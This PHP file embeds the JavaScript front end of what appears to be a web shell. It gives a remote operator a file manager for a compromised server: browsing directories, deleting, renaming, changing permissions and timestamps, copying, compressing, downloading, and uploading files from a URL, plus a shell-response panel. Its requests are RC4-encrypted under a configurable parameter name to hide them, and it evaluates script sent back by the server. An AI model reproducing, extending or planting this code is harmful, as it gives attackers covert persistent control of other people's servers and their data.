<?php

$code = 
'	
	var h = 0;
	var j = 1;
	var d = document;
	var euc = encodeURIComponent;
	var onDrag = false;
	var dragX, dragY, dragDeltaX, dragDeltaY, lastAjax , lastLoad = "";
	var copyBuffer = []; 
	
	sorttable={k:function(a){sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,0==a.getElementsByTagName("thead").length&&(the=d.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);
	if(1==a.tHead.rows.length){sortbottomrows=[];for(b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=d.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&
	(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(d.getElementById("sorttable_sortfwdind")),sortrevind=d.createElement("span"),sortrevind.id="sorttable_sortrevind",
	sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(d.getElementById("sorttable_sortrevind")),sortfwdind=d.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,
	function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=d.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=d.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=d.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML=
	"&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=
	sorttable.l;for(c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=
	a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(b="",c=0;c<a.childNodes.length;c++)b+=
	sorttable.d(a.childNodes[c]);return b.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(a){newrows=[];for(b=0;b<a.rows.length;b++)newrows[newrows.length]=a.rows[b];for(b=newrows.length-1;0<=b;b--)a.appendChild(newrows[b]);delete newrows},n:function(a,b){aa=parseFloat(a[0].replace(/[^0-9.-]/g,""));isNaN(aa)&&(aa=0);bb=parseFloat(b[0].replace(/[^0-9.-]/g,""));isNaN(bb)&&(bb=0);return aa-bb},l:function(a,b){return a[0].toLowerCase()==b[0].toLowerCase()?0:a[0].toLowerCase()<b[0].toLowerCase()?
	-1:1},g:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},m:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&
	(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(c=0,e=a.length-1,g=h;g;){for(g=j,f=c;f<e;++f)0<b(a[f],a[f+1])&&(g=a[f],a[f]=a[f+1],a[f+1]=g,g=h);e--;if(!g)break;for(f=e;f>c;--f)0>b(a[f],a[f-1])&&(g=a[f],a[f]=a[f-1],a[f-1]=g,g=h);c++}}};
	n=1;function p(a){b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(e=0;e<a.length;e++)b.call(c,a[e],e,a)});
	Function.prototype.forEach=function(a,b,c){for(e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};

	function append(e, c){
		o = d.getElementById(e);
		if (o) o.innerHTML += c;
	}
	
	function prepend(e, c){
		o = d.getElementById(e);
		if (o) o.innerHTML = c + o.innerHTML;
	}

	function remove(e){
		o = d.getElementById(e);
		if (o) o.parentNode.removeChild(o);
	}

	function empty(e){
		o = d.getElementById(e);
		if (o) o.innerHTML = null;
	}
	
	function serialize(form){
		var i, j, q = [];
		if (!form || form.nodeName !== "FORM") return;
		for (i = form.elements.length - 1; i >= 0; i = i - 1){
			if (form.elements[i].name === "") continue;
			switch (form.elements[i].nodeName){
				case "INPUT":
					switch (form.elements[i].type){
						case "text":
						case "hidden":
						case "password":
						case "button":
						case "reset":
						case "submit":
							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
							break;
						case "checkbox":
						case "radio":
							if (form.elements[i].checked) q.push(form.elements[i].name + "=" + euc(form.elements[i].value));				
							break;
						case "file":
							break;
					}
					break;			 
				case "TEXTAREA":
					q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
					break;
				case "SELECT":
					switch (form.elements[i].type){
						case "select-one":
							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
							break;
						case "select-multiple":
							for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1){
								if (form.elements[i].options[j].selected) q.push(form.elements[i].name + "=" + euc(form.elements[i].options[j].value));
							}
							break;
					}
					break;
				case "BUTTON":
					switch (form.elements[i].type){
						case "reset":
						case "submit":
						case "button":
							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
							break;
					}
					break;
			}
		}
		return q.join("&");
	}
	
	function getData(s, m){
		k = rc4Init(hash);
		try {
			if (m === "e") {
				//console.log(s);
				r = euc(btoa(rc4(randStr(' . $config['rc4drop'] . ') + s, k)));
			} else
				r = rc4(atob(s), k).substr(' . $config['rc4drop'] . ');
		} catch(err) {
			r = d;
		}
		
		return r;
	}
	
	function ajax(p, cf){
		console.log(p);
		var ao = {};
		lastAjax = p;
		ao.cf = cf;
		ao.request = new XMLHttpRequest();
		ao.bindFunction = function (caller, object){
			return function (){
				return caller.apply(object, [object]);
			};
		};
		ao.stateChange = function (object){
			if (ao.request.readyState == 4) ao.cf(getData(ao.request.responseText, "d"));
		};
		if (window.XMLHttpRequest){
			req = ao.request;
			req.onreadystatechange = ao.bindFunction(ao.stateChange, ao);
			req.open("POST", targeturl, true);
			req.setRequestHeader("X-Requested-With", "XMLHttpRequest");
			req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			req.setRequestHeader("Connection", "close");
			req.send("' . $config['consNames']['post'] . '=" + getData(p, "e"));
		}
		return ao;
	}

	function dpath(e, t){
		if (t)
			return d.getElementById("base").value + e.parentNode.parentNode.getAttribute("data-path");
		else
			return e.parentNode.parentNode.getAttribute("data-path");
	}

	//TODO removeEventListener
	function drag_start(){
		if(!onDrag){
			onDrag = true;
			//d.removeEventListener("mousemove", function(e){}, false);
			d.addEventListener("mousemove", function(e){
				dragX = e.pageX;
				dragY = e.pageY;
			}, false);
			setTimeout("drag_loop()", 50);
		}
	}

	function drag_loop(){
		if (onDrag){
			x = dragX - dragDeltaX;
			y = dragY - dragDeltaY;
			if (x < 0) x = 0;
			if (y < 0) y = 0;
			o = d.getElementById("box").style;
			o.left = x + "px";
			o.top = y + "px";
			setTimeout("drag_loop()", 50);
		}
	}

	function drag_stop(){
		onDrag = false;
		//d.removeEventListener("mousemove", function(e){}, false);
	}

	function show_box(t, ct){
		hide_box();
		box = "<div id=\'box\' class=\'box\'><p id=\'boxtitle\' class=\'boxtitle\'>"+t+"<span onclick=\'hide_box();\' class=\'boxclose floatRight\'>x</span></p><div class=\'boxcontent\'>"+ct+"</div></div>";
		append("content", box);

		x = (d.body.clientWidth - d.getElementById("box").clientWidth)/2;
		y = (d.body.clientHeight - d.getElementById("box").clientHeight)/2;
		if (x < 0) x = 0;
		if (y < 0) y = 0;
		dragX = x;
		dragY = y;
		o = d.getElementById("box").style;
		o.left = x + "px";
		o.top = y + "px";
			
		d.addEventListener("keyup", function (e){
			if (e.keyCode === 27) hide_box();
		});
		
		d.getElementById("boxtitle").addEventListener("click", function(e){
			e.preventDefault();
			if (!onDrag){		
				dragDeltaX = e.pageX - parseInt(o.left);
				dragDeltaY = e.pageY - parseInt(o.top);
				drag_start();
			} else
				drag_stop();
		}, false);

		if (d.getElementById("uival")) d.getElementById("uival").focus();
	}

	function hide_box(){
		onDrag = false;
		//d.removeEventListener("keyup", function(e){}, false);
		remove("box");
		remove("dlf");
	}

	function ajaxLoad(p){
		empty("content");
		append("content", "<div class=\'loading\'></div>");
		ajax(p, function(r){
			empty("content");
			append("content", r);
			uiUpdateControls();
			lastLoad = p;
		});
	}
	
	function uiUpdateControls(){
		o = d.getElementById("jseval");
		if (o) eval(o.value);
		o = d.getElementById("sort");
		if (o) sorttable.k(o);
		o = d.getElementById("etime");
		if (o) d.getElementById("uetime").innerHTML = o.value;
	}
	
	function viewSize(f){
		f.innerHTML = "<div class=\'loading mini\'></div>";
		ajax("me=filemanager&md=vs&f=" + euc(dpath(f, true)), function(r){
			f.innerHTML = r;
		});
	}

	function godir(f, t){
		ajaxLoad("me=filemanager&dir=" + euc(dpath(f, t)));
	}
	
	function godisk(f){
		ajaxLoad("me=filemanager&dir=" + euc(f.getAttribute("data-path")));
	}
	
	function godirui(){
		ajaxLoad("me=filemanager&dir=" + euc(d.getElementById("goui").value));
	}
	
	function showUI(a, o){
		path = dpath(o, false);
		datapath = dpath(o, true);
		disabled = "";
		text = "' . tText('name', 'Name') . '";
		btitle = "' . tText('go', 'Go!') . '";

		if (a === "del"){
			disabled = "disabled";
			title = "' . tText('del', 'Del') . '";
		} else if (a === "ren"){
			title = "' . tText('rname', 'Rename') . '";
		} else if (a === "mpers"){
			path = o.innerHTML.substring(17, 21);
			title = "' . tText('chmodchown', 'Chmod/Chown') . '";
			text = title.substring(0, 5);
		} else if (a === "mdate"){
			path = o.getAttribute("data-ft");
			title = "' . tText('date', 'Date') . '";
			text = title;
		} else if ((a === "cdir") || (a === "cfile")){
			path = "";
			datapath = d.getElementById("base").value;
			title = "' . tText('createdir', 'Create directory') . '";
			if (a === "cfile") title = "' . tText('createfile', 'Create file') . '";
		}
	
		ct = "<table class=\'boxtbl\'>" +
				"<tr><td class=\'colFit\'>" + text + "</td><td>' . mInput('uival', '" + path + "', '', '', '', '" + disabled + "') . '</td></tr>" +
				"<tr data-path=\'" + datapath + "\'><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, dpath(this, false), d.getElementById(&quot;uival&quot;).value);\'>" + btitle + "</span></td></tr>" +
			 "</table>";
		show_box(title, ct);
	}	
	
	function showUISec(a){
		btitle = "' . tText('go', 'Go!') . '";
		uival = "";
		n = "&quot;&quot;";
		s = serialize(d.forms[0]).replace(/chkall=&/g, "");
		s = s.substring(0, s.indexOf("&goui=")); 

		if (a === "comp"){
			title = "' . tText('download', 'Download') . '";
		} else if (a === "uncomp"){
			title = "' . tText('uncompress', 'Uncompress') . '";
		} else if (a === "copy"){
			title = "' . tText('copy', 'Copy') . '";
			uival = "<tr><td class=\'colFit\'>' . tText('to', 'To') . '</td><td>' . mInput('uival', '') . '</td></tr>";
			n = "d.getElementById(&quot;uival&quot;).value";
		} else if (a === "rdel"){
			title = "' . tText('del', 'Del') . '";
		}

		ct = "<table class=\'boxtbl\'>" + 
				uival + 
				"<tr><td colspan=\'2\'><textarea disabled=\'\' wrap=\'off\' style=\'height:120px;min-height:120px;\'>" + decodeURIComponent(s).replace(/&/g, "\n") + "</textarea></td></tr>" +
				"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, &quot;&" + s + "&fl=" + euc(d.getElementById("base").value) + "&quot;, " + n + ");\'>" + btitle + "</span></td></tr>" +
				"</table>";
		show_box(title, ct);
	}
	
	function showFMExtras(){
		ct = "<form name=\'fmexs\'>" +
			 "<table class=\'boxtbl\'>" +
				"<tr><td class=\'colFit\'>' . tText('fmso', 'Show only') . mSelect('fm_mode', array('all' => 'All', 'file' => 'File', 'dir' => 'Dir')) . '</td><td>&nbsp;</td></tr>" +
				"<tr><td class=\'colFit\'>' . tText('fmow', 'Only writable') . mCheck('fm_onlyW', '1', '') . '</td><td>&nbsp;</td></tr>" +
				"<tr><td class=\'colFit\'>' . tText('fmrl', 'Recursive listing') . mCheck('fm_rec', '1') . '</td><td>&nbsp;</td></tr>" +
				"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'ajaxLoad(serialize(d.forms[1]));\'>' . tText('fms', 'Show') . '</span></td></tr>" +
			 "</table>" +
			 "' . mHide('me', 'file') . mHide('dir', '" + d.getElementById("base").value + "') . '" +
			 "</form>";
		
		show_box("' . tText('showfmextras', 'Show extra tools') . '", ct);
	}
	
	function processUI(a, o, n){
		' . ($config['checkBDel'] ? '
		if (a === "del" || a === "rdel")
			if (!confirm(\'' . tText('merror', 'Are you sure?') . '\')) {
				hide_box();
				return;
			}
		' : '') . '
        if (a === "comp"){
            hide_box();
            append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getData("me=filemanager&md=tools&ac=comp&" + o , "e") + "\'></iframe>");
        } else {
        	if (a === "uncomp") o = "dummy" + o;
            else if (a !== "rdel" && n === "") return;
            else if (a !== "copy" && a !== "rdel") o = euc(o);
            else if (a === "ren") n = d.getElementById("base").value + n;

            append("box", "<div id=\'mloading\' class=\'loading mini\'></div>");
            ajax("me=filemanager&md=tools&ac=" + a + "&a=" + o + "&b=" + euc(n), function(r){
                remove("mloading");
                if (r === "OK"){
                    hide_box();
                    ajaxLoad(lastLoad);
                } else                    
                    append("box", "<div class=\'boxresult\'>" + r + "</div>");
            });
        }
    }
	
	function dl(o){
		remove("dlf");
		append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getData("me=filemanager&md=tools&ac=dl&fl=" + euc(dpath(o, true)), "e") + "\'></iframe>");
	}
	
	function up(){
		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'" + targeturl + "\'>" +
				"<input type=\'hidden\' value=\'" + decodeURIComponent(getData("me=filemanager&ac=up&dir=" + euc(d.getElementById("base").value), "e")) + "\' name=\'' . $config['consNames']['post'] . '\'>" +
				"<table class=\'boxtbl\'>" +
					"<tr><td class=\'colFit\'>' . tText('url', 'URL') . '</td><td>' . mInput('uri', '') . '</td></tr>" +
					"<tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input id=\'upf\' name=\'upf\' value=\'\' type=\'file\' /></td></tr>" +
					"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'upaction()\'>' . tText('go', 'Go!') . '</span></td></tr>" +
				"</table>" +
			 "</form>";
		show_box("' . tText('upload', 'Upload') . '", ct);
	}

	function upaction(){
		uri = d.getElementById("uri").value;
		if (uri !== "")
			processUI("reup", d.getElementById("base").value, uri);
		else if (d.getElementById("upf").value !== "")
			document.up.submit();
	}
	
	function uiupdate(t){
		ajax(serialize(d.forms[t]), function(r){
			if (!d.getElementById("uires"))
				prepend("content", "<div id=\'uires\' class=\'uires\'></div>");

			append("uires", "' . tText('sres', 'Shell response') . ': " + r + "<br>\n");
			d.getElementById("uires").scrollIntoView();
		});
	}


	function CheckAll(form){
		for(i = 0; i < form.elements.length; i++){
			e = form.elements[i];
			if (e.name != "chkall") e.checked = form.chkall.checked;
		}
	}
		
	function toggle(b){
		if (d.getElementById(b)){
			if (d.getElementById(b).style.display == "block") d.getElementById(b).style.display = "none";
			else d.getElementById(b).style.display = "block"
		}
	}
	
	function change(l, b){
		d.getElementById(l).style.display = "none";
		d.getElementById(b).style.display = "block";
		if (d.getElementById("goui")) d.getElementById("goui").focus();
	}
	
	function hilite(e){
		c = e.parentElement.parentElement;
		if (e.checked) 
			c.className = "mark";
		else 
			c.className = "";
		
		a = d.getElementsByName("cbox");
		b = d.getElementById("total_selected");
		c = 0;
		
		for (i = 0;i<a.length;i++) 
			if(a[i].checked) c++;
			
		if (c==0) 
			b.innerHTML = "";
		else 
			b.innerHTML = " ( selected : " + c + " items )";
	}
';